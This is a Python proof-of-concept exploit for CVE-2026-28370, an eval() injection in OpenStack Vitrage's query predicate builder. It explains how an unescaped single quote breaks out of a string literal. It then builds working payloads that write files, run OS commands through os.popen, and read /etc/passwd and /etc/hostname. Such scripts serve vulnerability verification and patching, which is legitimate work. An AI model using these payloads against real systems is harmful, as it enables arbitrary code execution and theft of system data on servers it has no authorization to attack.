#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenStack Vitrage eval() Injection — Value Injection
# CVE            : CVE-2026-28370
# Vendor         : OpenStack
# Product        : Vitrage
# Affected       : All versions before 12.0.1, 13.0.0, 14.0.0, 15.0.0
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28370: OpenStack Vitrage eval() Injection — Value Injection PoC

Demonstrates arbitrary code execution through Python eval() injection in
OpenStack Vitrage's create_predicate() function (vitrage/graph/query.py).

The vulnerability exists because _evaluable_str() wraps user-supplied string
values in single quotes WITHOUT escaping embedded single quotes. This allows
an attacker to break out of the string literal and inject arbitrary Python
code into the expression string that is passed to eval().

ATTACK CHAIN:
  1. Craft query dict with single-quote breakout in value position
  2. create_predicate() builds expression string and passes to eval()
  3. Injected Python code executes when the lambda predicate is invoked

PREREQUISITES:
  - OpenStack Vitrage < 12.0.1 (or 13.0.0, 14.0.0, 15.0.0)
  - Authenticated access to Vitrage API (or direct function access)

REFERENCES:
  - CVE-2026-28370
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28370
  - https://github.com/openstack/vitrage/blob/a1f86950e1314b0c740f9cd9b7e9dbab7d02af51/vitrage/graph/query.py#L70
"""

import sys
import os
import inspect
import json
import traceback

# ============================================================================
# Configuration
# ============================================================================
EVIDENCE_DIR = "/tmp/poc_evidence"
MARKER_FILE = os.path.join(EVIDENCE_DIR, "cve-2026-28370-pwned.txt")
EXFIL_FILE = os.path.join(EVIDENCE_DIR, "exfiltrated_data.txt")

# ============================================================================
# Color output helpers
# ============================================================================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def info(msg):
    print(f"{CYAN}[*]{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[-]{RESET} {msg}")

def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")

def header(msg):
    print(f"\n{BOLD}{'='*70}")
    print(f"  {msg}")
    print(f"{'='*70}{RESET}\n")


# ============================================================================
# Dummy graph vertex for predicate invocation
# ============================================================================
class FakeVertex:
    """Mimics a Vitrage graph vertex object (networkx node dict wrapper).

    create_predicate() returns a lambda like:
        lambda item: (item.get('key') == 'value')
    The lambda expects an object with a .get() method.
    """
    def __init__(self, data=None):
        self._data = data or {}

    def get(self, key):
        return self._data.get(key, "")

    def __repr__(self):
        return f"FakeVertex({self._data})"


# ============================================================================
# Test 1: Verify the vulnerability exists (source code inspection)
# ============================================================================
def test_vulnerability_exists():
    """Confirm the vulnerable eval() call exists in the installed code."""
    header("TEST 1: Verify Vulnerability Exists")

    from vitrage.graph.query import create_predicate, _evaluable_str

    # Check that eval() is used in create_predicate
    source = inspect.getsource(create_predicate)
    if "eval(" in source:
        success("create_predicate() contains eval() call")
    else:
        fail("eval() NOT found in create_predicate() — may be patched")
        return False

    # Check that _evaluable_str does NOT escape single quotes
    test_input = "hello'world"
    result = _evaluable_str(test_input)
    expected_vulnerable = "'hello'world'"  # unescaped = vulnerable

    if result == expected_vulnerable:
        success(f"_evaluable_str() does NOT escape quotes: {repr(result)}")
    else:
        fail(f"_evaluable_str() appears to escape quotes: {repr(result)}")
        return False

    # Check version
    import vitrage
    info(f"Vitrage version: {vitrage.__version__}")
    return True


# ============================================================================
# Test 2: Arbitrary code execution via VALUE injection
# ============================================================================
def test_value_injection():
    """Demonstrate code execution by injecting through query dict VALUE."""
    header("TEST 2: Code Execution via VALUE Injection")

    from vitrage.graph.query import create_predicate

    # Clean up any previous evidence
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)

    # Craft the malicious payload
    # The query dict value contains a single quote to break out of _evaluable_str(),
    # then injects Python code to write a marker file.
    #
    # Normal query generates: lambda item: (item.get('x')== 'normal_value')
    # Malicious generates:    lambda item: (item.get('x')== '' + str(open('/tmp/.../marker','w').write('PWNED')) + '')
    #
    # When the lambda is invoked, open().write() executes, writing the marker file.

    marker_content = "CVE-2026-28370 - Arbitrary code execution via eval() injection"
    payload_code = f"str(open('{MARKER_FILE}','w').write('{marker_content}'))"
    malicious_value = f"' + {payload_code} + '"

    payload = {"==": {"x": malicious_value}}

    info(f"Payload dict: {json.dumps(payload)}")

    # Step 1: Call create_predicate() — this calls eval() and creates the lambda
    info("Calling create_predicate() with malicious payload...")
    try:
        predicate = create_predicate(payload)
        success("create_predicate() returned a lambda (eval succeeded)")
    except Exception as e:
        fail(f"create_predicate() raised exception: {e}")
        return False

    # Step 2: Invoke the predicate — this triggers the injected code
    info("Invoking the predicate on a fake vertex (triggers injected code)...")
    try:
        vertex = FakeVertex({"x": "anything"})
        result = predicate(vertex)
        info(f"Predicate returned: {result}")
    except Exception as e:
        # Even if the predicate throws, the side-effect (file write) may have executed
        warn(f"Predicate invocation raised: {e}")

    # Step 3: Verify the marker file was created
    if os.path.exists(MARKER_FILE):
        with open(MARKER_FILE, 'r') as f:
            content = f.read()
        success(f"MARKER FILE CREATED: {MARKER_FILE}")
        success(f"File contents: '{content}'")
        success("ARBITRARY CODE EXECUTION CONFIRMED via VALUE injection!")
        return True
    else:
        fail(f"Marker file was NOT created at {MARKER_FILE}")
        return False


# ============================================================================
# Test 3: OS command execution via VALUE injection
# ============================================================================
def test_command_execution():
    """Demonstrate OS command execution through the eval() injection."""
    header("TEST 3: OS Command Execution via eval() Injection")

    from vitrage.graph.query import create_predicate

    # This payload runs 'id' and 'whoami' commands and writes output to a file
    cmd_output_file = os.path.join(EVIDENCE_DIR, "cmd_output.txt")
    if os.path.exists(cmd_output_file):
        os.remove(cmd_output_file)

    # Payload: execute 'id' and write output to file
    payload_code = (
        f"str(open('{cmd_output_file}','w').write("
        f"'CMD: id\\n' + __import__('os').popen('id').read() + "
        f"'CMD: whoami\\n' + __import__('os').popen('whoami').read() + "
        f"'CMD: hostname\\n' + __import__('os').popen('hostname').read() + "
        f"'CMD: uname -a\\n' + __import__('os').popen('uname -a').read()"
        f"))"
    )
    malicious_value = f"' + {payload_code} + '"
    payload = {"==": {"x": malicious_value}}

    info("Payload: Execute 'id', 'whoami', 'hostname', 'uname -a' commands")

    try:
        predicate = create_predicate(payload)
        vertex = FakeVertex({"x": "anything"})
        predicate(vertex)
    except Exception as e:
        warn(f"Exception during execution: {e}")

    # Verify command output
    if os.path.exists(cmd_output_file):
        with open(cmd_output_file, 'r') as f:
            content = f.read()
        success(f"COMMAND OUTPUT FILE CREATED: {cmd_output_file}")
        print(f"\n{CYAN}--- Command Output ---{RESET}")
        print(content.rstrip())
        print(f"{CYAN}--- End Output ---{RESET}\n")
        success("OS COMMAND EXECUTION CONFIRMED!")
        return True
    else:
        fail("Command output file was NOT created")
        return False


# ============================================================================
# Test 4: Data exfiltration (read sensitive file)
# ============================================================================
def test_data_exfiltration():
    """Demonstrate reading sensitive files via the eval() injection."""
    header("TEST 4: Data Exfiltration (Read Sensitive Files)")

    from vitrage.graph.query import create_predicate

    if os.path.exists(EXFIL_FILE):
        os.remove(EXFIL_FILE)

    # Read /etc/passwd and /etc/hostname and write to evidence file
    payload_code = (
        f"str(open('{EXFIL_FILE}','w').write("
        f"'=== /etc/hostname ===\\n' + open('/etc/hostname').read() + "
        f"'\\n=== /etc/passwd (first 5 lines) ===\\n' + "
        f"'\\n'.join(open('/etc/passwd').read().strip().split('\\n')[:5]) + '\\n'"
        f"))"
    )
    malicious_value = f"' + {payload_code} + '"
    payload = {"==": {"x": malicious_value}}

    info("Payload: Read /etc/hostname and /etc/passwd")

    try:
        predicate = create_predicate(payload)
        vertex = FakeVertex({"x": "anything"})
        predicate(vertex)
    except Exception as e:
        warn(f"Exception during execution: {e}")

    if os.path.exists(EXFIL_FILE):
        with open(EXFIL_FILE, 'r') as f:
            content = f.read()
        success(f"EXFILTRATED DATA FILE CREATED: {EXFIL_FILE}")
        print(f"\n{CYAN}--- Exfiltrated Data ---{RESET}")
        print(content.rstrip())
        print(f"{CYAN}--- End Data ---{RESET}\n")
        success("DATA EXFILTRATION CONFIRMED!")
        return True
    else:
        fail("Exfiltration file was NOT created")
        return False


# ============================================================================
# Main
# ============================================================================
def main():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370: OpenStack Vitrage eval() Injection PoC           ║
║   Affected: Vitrage < 12.0.1, 13.0.0, 14.0.0, 15.0.0             ║
║   CVSS: 9.1 (Critical) | CWE-95 (Eval Injection)                  ║
╚══════════════════════════════════════════════════════════════════════╝{RESET}
""")

    # Create evidence directory
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    results = {}

    # Test 1: Confirm vulnerability exists
    results["vulnerability_exists"] = test_vulnerability_exists()

    if not results["vulnerability_exists"]:
        fail("Vulnerability not found — target may be patched. Aborting.")
        sys.exit(1)

    # Test 2: Arbitrary code execution via VALUE injection
    results["value_injection"] = test_value_injection()

    # Test 3: OS command execution
    results["command_execution"] = test_command_execution()

    # Test 4: Data exfiltration
    results["data_exfiltration"] = test_data_exfiltration()

    # ======================================================================
    # Summary
    # ======================================================================
    header("RESULTS SUMMARY")
    total = len(results)
    passed = sum(1 for v in results.values() if v)

    for test_name, result in results.items():
        status = f"{GREEN}PASS{RESET}" if result else f"{RED}FAIL{RESET}"
        print(f"  [{status}] {test_name}")

    print()
    if passed == total:
        success(f"ALL {total}/{total} TESTS PASSED")
        success("CVE-2026-28370 is CONFIRMED EXPLOITABLE")
        print(f"\n{YELLOW}Evidence files:{RESET}")
        for f in os.listdir(EVIDENCE_DIR):
            print(f"  - {EVIDENCE_DIR}/{f}")
        return 0
    else:
        warn(f"{passed}/{total} tests passed")
        if passed > 0:
            warn("CVE-2026-28370 is PARTIALLY confirmed")
        else:
            fail("CVE-2026-28370 could NOT be confirmed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
